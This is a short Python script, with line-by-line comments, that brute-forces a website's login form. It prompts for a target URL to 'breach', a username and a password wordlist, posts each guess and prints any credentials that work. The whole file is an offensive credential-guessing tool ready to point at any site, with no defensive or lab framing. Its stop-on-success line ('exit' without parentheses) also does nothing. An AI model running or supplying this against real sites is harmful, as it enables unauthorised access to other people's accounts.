import requests     # Allows us to automate the process of sending the "Get" and "Post" requests

url = input("[+]Enter the  website that you want to breach: ")     # here we are asking the user to share the link of the webpage (URL) 
username = input("[+]Enter the username of that account: ") # Asking the user to share the .txt file of all the usernames.
password_list = input("[+]Add you password list: ") # same with the passwords,  asking the user to share .txt file of all the password list
login_failed = input("[+] Write what the website says after fail logging in? ") # Here we are asking the user to share the error message (string)  of the website when you put the wrong user/pass credentials.


def cracking(username, url):   # This is the function that will bruteforce into the website, the function takes in "username" and "url".
	for password in passwords: 
		password = password.strip() # The strip function will remove any leading, and trailing whitespaces which might cause a problem during the bruteforce.
		print('Trying: ' + password) # shows which password we are currently trying out 
		data = {'username':username, 'password':password, 'Login':'submit'} # our data is a dictionary, inside the dictionary we have a key and the value. And depending on the website the "usernanme" can named differently so check accordingly and change the "username" (thats in quotes) to the one named on the websties, same goes for the password, change it if its different (again the one in quotes) the username after the bulletpoints is the username file we asked the user at the beginning. same for password after the bullet points (:). At the last part is the submit button. Again according to the website change the name of it.
 
		response = requests.post(url, data=data) # here we store in a variable and  send the request to that page, this method used "POST" forms. (check the website which form it uses). and the post takes 2 arguments URL and the data
		if login_failed in response.content.decode(): # here it decodes and checks whether our respone (login_failed) matches the websties error message if our the user/pass is wrong. 
			pass  # it passes if the error message matches the login_failed variable
		else:  # if no errors are found, then it wille display user and pass
			print("[+] Ayyy, found username! ----> " + username) # prints out username that was found
			print("[+] Ayyy, Found password! ----> " + password) # prints out password that was found
			exit # exits the program if user and pass is found


with open(password_list, 'r') as passwords:    # Here we are opening the  the password file in "r", which means reading text file.
	cracking(username,url)
print("!!!! Password not found in list!") # if nothing is found that it prints this message
